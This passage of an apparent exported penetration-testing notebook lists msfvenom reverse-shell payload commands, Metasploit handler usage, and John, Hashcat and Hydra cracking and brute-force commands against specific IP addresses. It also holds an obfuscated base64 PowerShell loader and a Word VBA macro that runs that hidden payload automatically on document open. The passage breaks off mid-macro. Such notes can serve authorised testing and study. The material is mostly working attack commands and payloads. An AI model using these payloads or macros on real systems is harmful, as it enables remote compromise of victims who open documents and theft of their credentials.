href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/">https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/</a></p><p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f elf &gt; shell-x64.elf</p><p></p><p><span style="color:#3f4043;">multi handler:</span></p><p>use exploit/multi/handler</p><p>set lhost eth0</p><p>set lport 443</p><p>run</p><p></p><p></p><p><span style="color:#3f4043;">basic navigation and session management:</span></p><p>ctrl + z</p><p>search shell_to</p><p>use 0</p><p>sessions</p><p>set session 5</p><p>run</p><p>sessions 6</p><p></p><p><span style="color:#3f4043;">single port forwarding:</span></p><p>portfwd add -l 1234 -p 8080 -r 127.0.0.1</p><p></p></div><div class='page'><a name="Methdology--C2__Command_and_Control--Empire_397.html"></a><h1 class='title level-3'>Empire</h1><br/></div><div class='page'><a name="Methdology--C2__Command_and_Control--Cobalt_Strike_398.html"></a><h1 class='title level-3'>Cobalt Strike</h1><br/></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing_174.html"></a><h1 class='title level-2'>Cracking & Bruteforcing</h1><br/></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--John_175.html"></a><h1 class='title level-3'>John</h1><br/><p><span style="color:#3f4043;">Helpful for finding hash formats:</span></p><p>john --list:formats | grep krb</p><p></p><p><span style="color:#3f4043;">This is how to show the files you&#39;ve cracked with john:</span></p><p>john kerberoast --show</p><p></p><p><span style="color:#3f4043;">Remove potfile (removes history so you can crack again)</span></p><p>gedit /root/.john/john.pot</p><p></p><p><span style="color:#3f4043;">John syntax and krb5asrep cracking:</span></p><p>john --format=krb5asrep t-skid.hash --wordlist=/usr/share/wordlists/rockyou.txt</p><p></p><p><span style="color:#3f4043;">Krb5tgs hashes: (aka kerberoasted hashes)</span></p><p>john --format=krb5tgs kerberoast --wordlist=/usr/share/wordlists/rockyou.txt</p><p></p><p><span style="color:#3f4043;">NT hashes:</span></p><p>john --wordlist=/usr/share/wordlists/rockyou.txt uniq_hashes --format=NT</p><p></p><p><span style="color:#3f4043;">NetNTLMv2 hashes:</span></p><p>john --format=netntlmv2 hash.hash --wordlist=/usr/share/wordlists/rockyou.txt</p><p></p><p></p><p></p><p><span style="color:#3f4043;">Haiti for identifying hashtype:</span></p><p>gem install haiti-hash</p><p></p><p><span style="color:#3f4043;">Haiti syntax:</span></p><p>haiti &#39;741ebf5166b9ece4cca88a3868c44871e8370707cf19af3ceaa4a6fba006f224ae03f39153492853&#39;</p><p></p><p><span style="color:#3f4043;">Cracking with john the type:</span></p><p>john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-keccak-256</p></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Hashcat_412.html"></a><h1 class='title level-3'>Hashcat</h1><br/><p><img src="images/412-1.png" alt="images/412-1.png" /></p><p></p><p>hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt -O</p><p><img src="images/412-2.png" alt="images/412-2.png" /></p><p></p><p><span style="color:#3f4043;">Bruteforces random , numbers, letters of 9:</span></p><p>hashcat -a 3 -m 0 hash &#39;?a?a?a?a?a?a?a?a?a&#39; -O --force</p><p></p><p><span style="color:#3f4043;">bruteforce 8 digits:</span></p><p>.\hashcat.exe -m 22000 -a3 hashcat.hc22000 &quot;?d?d?d?d?d?d?d?d&quot; -O --force</p><p></p><p><span style="color:#3f4043;">Append anything at the end of list:</span></p><p>sed &#39;s/$/123/&#39; combined_names.txt | hashcat -m 22000 hash.hc2200</p><p>sed &#39;s/$/!/&#39; combined_names.txt | hashcat -m 22000 hash.hc2200</p><p></p><p><span style="color:#3f4043;">Rules:</span> <a href="https://hashcat.net/wiki/doku.php?id=hybrid_atttack_with_rules">https://hashcat.net/wiki/doku.php?id=hybrid_atttack_with_rules</a></p><p><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">https://hashcat.net/wiki/doku.php?id=rule_based_attack</a></p><p>hashcat -m 22000 hash.hc2200 norwegian.txt -r /usr/share/hashcat/rules/best64.rule</p><p>Basic rules structure:</p><p><img src="images/412-3.png" alt="images/412-3.png" /></p><p></p><p>This will capitalize first letter of every word and then end with 1!</p><p><img src="images/412-4.png" alt="images/412-4.png" /></p><p></p><p>same as first, then run rule again with all lowerletter with 99 at the end, and last one is just appended 99. but this will 3x the</p><p><img src="images/412-5.png" alt="images/412-5.png" /></p><p></p><p></p><p></p><p>:</p><p>l</p><p>u</p><p>c</p><p>c$!</p><p>c$1$!</p><p>l$1$2$3</p><p></p><p><span style="color:#3f4043;">grep only words with 7 or more characters:</span></p><p>grep -E &#39;.{7,}&#39; file.txt</p><p></p><p>from <a href="https://breachdirectory.org/">https://breachdirectory.org/</a></p><p>hashcat -m 100 -a3 &#39;42901db5e06492e1c8fb8777fbb2fafa141984b5&#39; &#39;bexe?l?l?l?l&#39;</p><p>hashcat -m 100 -a3 42901db5e06492e1c8fb8777fbb2fafa141984b5 bexe?l?l?l?l</p><p></p><p></p><p>Huge hashes.org password list</p><p><a href="https://www.reddit.com/r/DataHoarder/comments/ohlcye/hashesorg_archives_of_all_cracked_hash_lists_up/">https://www.reddit.com/r/DataHoarder/comments/ohlcye/hashesorg_archives_of_all_cracked_hash_lists_up/</a></p><p></p></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Hashcat--making_md5_hash_783.html"></a><h1 class='title level-4'>making md5 hash</h1><br/><p>echo -n &#39;aa1aa2aa#&#39; | openssl md5</p><p></p><p>echo -n &#39;1. 2̸́̉c̶̛͒7̴̂͗4̸̄̏&#39; | openssl md5</p><p></p><p>echo -n &#39;soon&#39; | openssl sha512</p></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Hydra_201.html"></a><h1 class='title level-3'>Hydra</h1><br/><p>Wordlists:</p><p>/usr/share/wordlists/rockyou.txt</p><p>/usr/share/seclists/Passwords/darkweb2017-top1000.txt</p><p>/usr/share/seclists/Passwords/darkweb2017-top10000.txt</p><p>/usr/share/wordlists/dirb/others/best1050.txt</p><p><a href="https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/common.txt">https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/common.txt</a></p><p></p><p></p><p></p><p>We can for instance use hydra like this</p><p></p><p><span style="color:#234141;">(Note: You can get the parameters used from burp suite response when enumerating)</span></p><p></p><p><span style="color:#234141;">login-form:</span></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&quot; -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">http-get:</span></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.54.52 http-get /inferno -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">FTP:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt -V 10.10.204.203 ftp -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">SSH:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt -V 10.10.204.203 ssh -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">IMAP:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt -V 10.10.204.203 imap -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#3f4043;">POP3:</span></p><p>hydra -l James -P /usr/share/wordlists/rockyou.txt -V 10.11.1.72 pop3 -V -e nsr -f -t 60 -K</p></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Haiti_459.html"></a><h1 class='title level-3'>Haiti</h1><br/><p>gem install haiti-hash</p><p></p><p>haiti &#39;68d6bb510d72beaae50dfe06b6656f62&#39;	</p><p><img src="images/459-1.png" alt="images/459-1.png" /></p></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Making_Wordlists_597.html"></a><h1 class='title level-3'>Making Wordlists</h1><br/></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Making_Wordlists--Cracken_599.html"></a><h1 class='title level-4'>Cracken</h1><br/><p><a href="https://github.com/shmuelamar/cracken">https://github.com/shmuelamar/cracken</a></p><p></p><p>Our method splits a password into its subwords instead of just a characters mask. HelloWorld123! splitted into [&#39;Hello&#39;, &#39;World&#39;, &#39;123!&#39;] as these three subwords are very common in other passwords.</p><p></p><p></p><p>Generate wordlist candidates from a hybrid mask - e.g. cracken -w rockyou.txt -w 100-most-common.txt &#39;?w1?w2?d?d?d?d?s&#39;</p><p></p><p><a href="https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt">https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt</a></p></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Making_Wordlists--Crunch_598.html"></a><h1 class='title level-4'>Crunch</h1><br/><p>crunch 5 5 &gt; pass.txt</p></div><div class='page'><a name="Methdology--Cracking_&_Bruteforcing--Making_Wordlists--User_lists_964.html"></a><h1 class='title level-4'>User lists</h1><br/><p></p><p># Make flast usernames from first last</p><p>awk &#39;NF&gt;1{printf &quot;%s%s\n&quot;, tolower(substr($1,1,1)), tolower($NF); next}{print tolower($0)}&#39; usernames.txt &gt; usernames_flast.txt</p><p></p><p># Make firstlast usernames from first last</p><p>tr -d &#39; &#39; &lt; usernames.txt &gt; usernames_nospace.txt</p><p></p><p># Make first.last usernames from first last</p><p>awk &#39;NF&gt;1{printf &quot;%s.%s\n&quot;, tolower($1), tolower($NF); next}{print tolower($0)}&#39; usernames.txt &gt; usernames_firstdotlast.txt</p><p></p><p># Make firstl usernames from first last</p><p>awk &#39;NF&gt;1{printf &quot;%s%s\n&quot;, tolower($1), tolower(substr($NF,1,1)); next}{print tolower($0)}&#39; usernames.txt &gt; usernames_firstl.txt</p><p></p><p># Make lastf usernames from first last</p><p>awk &#39;NF&gt;1{printf &quot;%s%s\n&quot;, tolower($NF), tolower(substr($1,1,1)); next}{print tolower($0)}&#39; usernames.txt &gt; usernames_lastf.txt</p><p></p><p># Make last.first usernames from first last</p><p>awk &#39;NF&gt;1{printf &quot;%s.%s\n&quot;, tolower($NF), tolower($1); next}{print tolower($0)}&#39; usernames.txt &gt; usernames_lastdotfirst.txt</p><p></p><p># Make flast8 usernames from first last</p><p>awk &#39;NF&gt;1{u=tolower(substr($1,1,1)$NF); print substr(u,1,8); next}{print substr(tolower($0),1,8)}&#39; usernames.txt &gt; usernames_flast8.txt</p><p></p><p># Remove quotes</p><p>sed  &#39;s/&quot;//g&#39;</p></div><div class='page'><a name="Methdology--Client_Side_Attacks_343.html"></a><h1 class='title level-2'>Client Side Attacks</h1><br/></div><div class='page'><a name="Methdology--Client_Side_Attacks--Malicous_Macro_344.html"></a><h1 class='title level-3'>Malicous Macro</h1><br/></div><div class='page'><a name="Methdology--Client_Side_Attacks--Malicous_Macro--Initial_Payload_347.html"></a><h1 class='title level-4'>Initial Payload</h1><br/><p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.189 LPORT=443 -f hta-psh</p><p></p><p></p><p></p><p><img src="images/347-1.png" alt="images/347-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Client_Side_Attacks--Malicous_Macro--base64macro.py_346.html"></a><h1 class='title level-4'>base64macro.py</h1><br/><p>str = &quot;powershell.exe -ep bypass -nop  -w hidden -e powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATgBDADIAdwBHAEkAQwBBADcAVgBXAGIAVwArAGIAUwBCAEQAKwBYAHEAbgAvAEEAVgBXAFcAQQBKADMAagB0ADcAaABKAEUANgBuAFMAZwBWAHsAMQB9AHgAVABHAEsAYgBHAE0AZAAyAHIAZABNAEcARgB0AGgANABZAFIAMQBZAC8ATgBiAHIAZgA3ADgAQgBRADUAeABlAGsAcgB2AGMAUwBWADMASgBNAHMAegBPAHoATQA0ACsAOAA4AHcATQBUAGgAeABZAG4ATABCAEEAYwBPADIASgA4AFAAMwBqAEIAeQBGAGIAQQB4AFEAaQBYADUAQQBLAE0AZgAxAGMARgBBAHEAUAAvAGwAbQBmAHkATQBmAGQAQQAnACcAKwAnACcAagBGAE8AaABhACsAQwBOAEYAZABXAHEAeQBiAHoARQBRAGsAVwBsADUAZQBOAE8AQQB4AHgAdwBBAC8AdgBwAFEANwBtAFMAaABSAGgALwA1ADQAUwBIAEUAbQB5ADgASwBjAHcAOABYAEMASQBUADIANwB1AEgANwBEAEYAaABlAHsAMQB9AEMANABZAHsAMQB9AFMAaAA3AEoANwBSAEQATwAxAFgAUQBOAFoASABoAFoATwBsAE0AQgBPAHsAMQB9AHYAcgBNAFEAawBsAGcASgBXAE4ARgBDAFoAZgBFAGIAewAxAH0AewAxAH0ARQBlAFgANQBTAFgAWgBSAGEAagB6AEcAaQBrAFMAUQBhAHUANABoAGoAdgAyAFIAVABLAHMAcgBDAEQAegBrADUAOABIAGEAMwB3AHAASwBvAEUAeQB0AGsARQBYAE4ANABhAFUASwBDAHsAMgB9ACcAJwArACcAJwAxAHAAcABIAEUAVABJAHcAZABmAGcAYgBZADEAMQB6AEQAMQBtAFIAeQBMAGMANQBYAGkAYgBFAFAATQA0AEQATgBKAEwASgBWADQATwBPAHAASQBJAGoANABPAFEAVwBZAHAAdABoAHoAaQBLAHgASwBJAHcAVAAvAHoAUABGADQAdgBmAHAAWABsADIAKwBDAGcATwBPAFAARgB4AFMAUQBzADQARAB0AG4ASwB3AE8ARwBhAFcARABnAHEAZABWAEYAZwBVAHoAegBDAHoAZwBLAHMARABCADYAUwB3AEYAMwBJAE0AcQBpAHQAMgBSAEoATABoAFMAQwBtAHQAQwBqADgARgB6AGYAUwBOACcAJwArACcAJwBkADcAawB7ADIAfQBMADMAWABTAEgAcAB1AEIARgBvAEQASABzAHAARgBTAE8AbgBMAGEAKwByAE0AagBpAGsAKwBHAEkAcQB2AHgASgBtAHcAUQBJAGIAMQB4AEEAUwBBADcAewAyAH0AZQBDACcAJwArACcAJwBvAEoATwB6AEoAMgAnACcAKwAnACcAeAA0AHIANwBEAG4ASwBNAGoAWABQAE4AMwBCAEUATABFAHsAMgB9AFkAQgBGAEoAYgBiADgASwBsAGEASwBnAHcAKwBHAEkAcwAzAEEASAByADQAWABiAE0ATQBiAHkANABnAGwAdgBvAGIAQwBwAG8AZQBKADcAbgBWACcAJwArACcAJwBWAHoAUwA3AEMATABZAGcAOABrAGMANQBNAFIAZQAzAEcAewAyAH0ALwB5AG4ANQBoAFgAVgBsACsAYgBCAEsAdABOADcAbQBjAGgATQA3AEoATQBEAE4AWABZAEIAOABZAHUAVgB7ADIAfQBsAFYANwBMAEMAWABZAG8AVABoAEUAcAA1AFcAcgBYAEUASwBFAGsAWgBoAHYAWQBiAG0ASwBLAFgAYwBRAFQAbQBCAE4AcQB2AEQAQgByACsAWQBRAC8AMgBhAG8AeABvAFQAWQBPAEYAUQB2AHkARwBrAEYAVQBrAEgATAA1ADUAMgBBAE8AbQBaAE4ARQBMAGQAQwB4AEQAKwBnAGQAMwBvAEcAcgBCAFEAZQBLAEIATwBmAGEAVwBXAEgAcwAnACcAKwAnACcAOAB0AE8AVABkADEAQQBTAEcAeABSAEYAVQBWAEUAWQB4AEYAQwBsAFYAbABFAHcATQBLAEwAWQBMAGcAcABLAEUASgBGAHMAUwA0AGsANQBTAHgALwBGAFkANwBoADYAVABEAG0AeABVAE0AUgB6AGQAdwB2ADUANwAzAGgAbQA1AHoAWgBZAEUAUABFAHcAdABpAEMAeABnAE0ARwB0AHMAYwBJAFcAUQBUAFMAQgBwAEMAaAB7ADIAfQBpAFkAMwBWAG4AVQBIAGMALwBIAHoAeABWAFUAQQBhAGkARgBJAG8ASAAvAEMAewAyAH0AaABvAFMAQQBKAEEASABDADQAQQBsAGQAUQBnAGcAMQBvAFkAWgBjAE0AJwAnACsAJwAnAGoARABYAC8AQgBYAEYAUABxAGkAawBYAGEATgBOAGsAUQBzAHsAMQB9AEkAcQB1AFIAbABGADcASQB4AGIAYgA0ACcAJwArACcAJwBWAHEAQgA1AE0AUgB5AFkAbgB7ADIAfQBDAFQAWQAvAEkAcwBUAE0AaQAzAFEAUgBrAHYAQwBpAFkASgBPAFQAUwBoAEIARwBaAGcAMgBQADgASgA0AG0AWAB6AE8AVQBUAFQAQwBIAEcAVwBIAGkAbQB2AHMAYgBtADYANAB7ADIAfQBrAFYARgBIAHcAegBZAFcAbQBHAFUASQBwAEgAeQBBAEcATABkAHMAaAA4AEYAVQBYADQAcgBIADUAbwBOAE4ASwBuADgAZwAxAHAASwBMAEMAbQBXAGsAQgAxAFMAMQAyAFMAcQByAEkAaABWAFUAMgBIADMANQBpAGMAYQBxAHgANQBiAGwALwAxAEgAcgByAGwAcwBMAG4AMQBIAEUAVwBMAE4ATAB7ADIAfQA3AGEAQQA2ADcAMwBmAHEANgBaADUAaAAxAGIAcgBRAHsAMgB9AGYAagBYAFEAdQBOADYANgBlADMAZwB3AGwATwA1AG8AUABPAFUAegBUAGUAbgBlAGsAcwBwAHkAVwB0ACsAdgBlAG0AUgB2AHsAMQB9AEIAVgA3AHUAaQAyAGYANwBkAFgAewAxAH0AcABxAEoAdQB7ADEAfQB3ACsAdQA3AFUAeQBiAGoAdQBPAGUATwA4AGEAbwArAHIAbABOACsAcABQAEcAVQBLADMAVQBVAEwALwBaAGkAdgBzAFQAZABhAE4AVwAnACcAKwAnACcANgBsAEcATABiAEwAcABEAE0AaAA0AHUAZQAyADEAKwBQAHoAVQBwAEcAagB0AGwAewAxAH0ANgA1ADYAZwBjAGkAMgBIAHoANgBZAFYAYQBiAHYATgBVAFgAcABlAEsAZgBXAHYAdQBlAFkASABVACsAMwBkAHsAMQB9AE4AdQArAFcASgBTAFgAeQBvAHQAUgBXAGsARQBMAGIATwB0AHMAcQB1AHAAJwAnACsAJwAnAEcAaQBxAEQAcwBqAGwAdQBxADgATgB4AFMAeAB7ADIAfQBPAFEAWABiAG0AbABwAHsAMgB9ADYAeQBHAGkATgB0AFoASABlAFkAUABaAHYASQA2AGEANABpAGgAcgBYAEEAeAB7ADEAfQA1ADYAcwBTAHMAawBkAG4AcQBiAHUAUwBCAHIAegBhAEUAbwBKAGMAcgBkAGMAMwBHAFcALwBhAGwAUAB5AEgAbQB1AG0AeQBpAHoAagBXAGYASwBZADEAZQB2AFcAcgBmAG0AZgB0AHUARABYAG0AewAxAH0AbQBSAG4AMwBMADIAYQBSADMAZQAnACcAKwAnACcAbwAxAE4AJwAnACsAJwAnADYAbwB5AHIAYgBaADYAYQByAE8AagB0AEUAYgBqAGMAWABzADIATQBaAGUAegB5AFMAMgBkAFQAYwBiAFYAJwAnACsAJwAnAEcAYwBQAFcAcAB1AHkAQgBEADQATABWAEcAMwBOADUAWAB7ADEAfQBZADcAcgB1AFoAdABxACcAJwArACcAJwB5ADYAYwBkAFoANwA2AHsAMQB9ADQAbABQADcAMgB0ADIAKwBXAEwAOABSAFEAewAyAH0AMgBWACsANQBnADcAZAByAEQAeQBmAGwAbwBlADcAMgA3AHIAegBGAGwAWABDADYAYgBuAHkARABWADgAegBFAEoAKwBHAGwAdABVAFMARABZADgAagBwAEoAVAAvAHoANABvAGIAJwAnACsAJwAnAEIAVAAxAGMANgB6AG4ATAAvAFYAOABYAFUAVQBSAGgANgBpAHcAQQBYAG8ANQBYAGwATgB0AGwAbgBZAHoAcgByAHoAZwBKAEgARQBRAHAASwBTAEcAYgAvAEUAWQBZAEEAcABqAEUAVQBZAG4ARABtAFIARgBVAHEAWgBsAGMAeQBHAHAASQAzAEQAVwBEAG8ATQBpADIAUgAyAGoAYgBVAHsAMgB9AHEAdABlAGUAWgBPAEYASgBVAFQANwBPAGoARgB4AHsAMgB9AGUAVABtAEQARwBLAEUAewAyAH0AZgBMAFAAVQB4ADQASABMAHYAVwBKAGwAZQAxAHEAcABRAEsAdQB2ACcAJwArACcAJwBiAEMAdgAxAHQAQQBUAGUAZgA2ADgARwBXACsAewAyAH0AawBjAEYAVgBNAFIAawBVAEsAeQA4AEUAegBUAFQAMgBEAE0AKwBJAEkAawB2AFQATABjAFkATABQAEEAUQA1AHQANgBVADIAawAzAGcASQBOAFQAbAA1AEMARQA0AEcAdQBkAHEAagBzAEIARABxAFYATQBmAG8AYwB1AE8AeABXAFQAegB3ADQANABnAGEAQQBWAGUASABhADgAKwBRADcANABFAEEAUABjAEgAQwBDAEgANABVAEMAVAArAGIAawA4ADcAbABiAGMARwBlADEAbQBmAHQATABLAFoATgAxAEsAQQAvACsANwBIACsAaAB6AEYASAAyAEQANwB2AHYAbwBsAEcAbABlAEkARABuAGgAZgBoAG4AdwBiAFAAdQAvAHUAJwAnACsAJwAnAHMAQQBtAEMARABDAFEAZABHAEEAVgBrAHYAeABZAGYAeQAvAGkAawBOAFcASgBjADgAeQBuAEMAWQBIAHkAcwBEAEoAVgB2AEoAUgBmAEIAUAB6AGsAMgB2ADQAegBFAHEAYgAvAFYAKwA1AEIAWQArAFMAagBRAHMAQQBBAEEAewAwACcAJwArACcAJwB9AHsAMAB9ACcAJwApAC0AZgAnACcAPQAnACcALAAnACcAOQAnACcALAAnACcAMAAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA==&quot;</p></div><div class='page'><a name="Methdology--Client_Side_Attacks--Malicous_Macro--Final_Payload_Example_345.html"></a><h1 class='title level-4'>Final Payload Example</h1><br/><p><span style="color:#3f4043;">Inside word, but make you make it a .doc document and then save first. Then when making macros make sure you link the macros to that newly made document. Then rest will be just fine. </span></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>Sub AutoOpen()</p><p> MyMacro</p><p>End Sub</p><p>Sub Document_Open()</p><p> MyMacro</p><p>End Sub</p><p>Sub MyMacro()</p><p> Dim Str As String</p><p></p><p>    Str = Str + &quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad&quot;</p><p>    Str = Str + &quot;ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA&quot;</p><p>    Str = Str + &quot;kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA&quot;</p><p>    Str = Str + &quot;H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk&quot;</p><p>    Str = Str + &quot;AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad&quot;</p><p>    Str = Str + &quot;wBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcAB&quot;</p><p>    Str = Str + &quot;vAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9A&quot;</p><p>    Str = Str + &quot;E4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQ&quot;</p><p>    Str = Str + &quot;AaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAU&quot;</p><p>    Str = Str + &quot;wB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQB&quot;</p><p>    Str = Str + &quot;tAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9A&quot;</p><p>    Str = Str + &quot;CcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACA&quot;</p><p>    Str = Str + &quot;AJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAc&quot;</p><p>    Str = Str + &quot;gBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB&quot;</p><p>    Str = Str + &quot;5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkA&quot;</p><p>    Str = Str + &quot;GUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU&quot;</p><p>    Str = Str + &quot;AbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAe&quot;</p><p>    Str = Str + &quot;gBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQB&quot;</p><p>    Str = Str + &quot;jAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5A&quot;</p><p>    Str = Str + &quot;FMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4&quot;</p><p>    Str = Str + &quot;AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAd&quot;</p><p>    Str = Str + &quot;AByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATgBLADQAdwB&quot;</p><p>    Str = Str + &quot;HAEkAQwBBADcAVgBXACsAMgAvAGkAewAxAH0AQgBEACsAZgBhA&quot;</p><p>    Str = Str + &quot;FgAOQBIADYASQBWAFUAaABLAEoAOABpAHEANwBmAFUAZwByAFg&quot;</p><p>    Str = Str + &quot;AYwBJAHoAbABMAFIAQQBTAGkAaQB3ADYARwBRAFMASgA3AGkAW&quot;</p><p>    Str = Str + &quot;QBtAEUAMABjAFgAcgB2ADcAdgA5ADgAWQBrAGsATABWAGQAcQA&quot;</p><p>    Str = Str + &quot;5ADMAMABsAHAAQwB4AFAAYgAnACcAKwAnACcATQBlAFAAegBOA&quot;</p><p>    Str = Str + &quot;E4AegBQADIANABzAEQAaABoAEEAVwBTAFYAegArADMAcABCADg&quot;</p><p>    Str = Str + &quot;AZgBQADAAagBKADYASwBBAFEATABTAFEAbABzAHkANQBrAHAAW&quot;</p><p>    Str = Str + &quot;QAnACcAKwAnACcAeQB6AFUAbwA4ADcAbQBlADkAegA2AGEAdQB&quot;</p><p>    Str = Str + &quot;rAGoATABYAGwAcwBzAG8AVwBpAEEAUwBUADYAKwB0AEsASABJA&quot;</p><p>    Str = Str + &quot;CcAJwArACcAJwBZADQANABJAGQANQByAG8ARwA1AEYAawBWADQ&quot;</p><p>    Str = Str + &quot;ATQBhAFUARQBSADQAbwBxAC8AWgBRAEcATQB4AHoAaQBzADcAd&quot;</p><p>    Str = Str + &quot;gBwAEkAMwBhADQAOQBFAFAASwAvAEoAewAyAH0AcgBVAEQAWgB&quot;</p><p>    Str = Str + &quot;GAE4AQgBIAGIAVgBwAEEAegB3ADkASwBaAEYAcgBoAGkAcgA4A&quot;</p><p>    Str = Str + &quot;DAAYwBKAEoAegBLAFcAVQB0AEsAdQBDAEoALwArAHkAYQByADQ&quot;</p><p>    Str = Str + &quot;ANwBQAGkASgBGAGYANwAnACcAKwAnACcASABpAE0AYQBLAGIAS&quot;</p><p>    Str = Str + 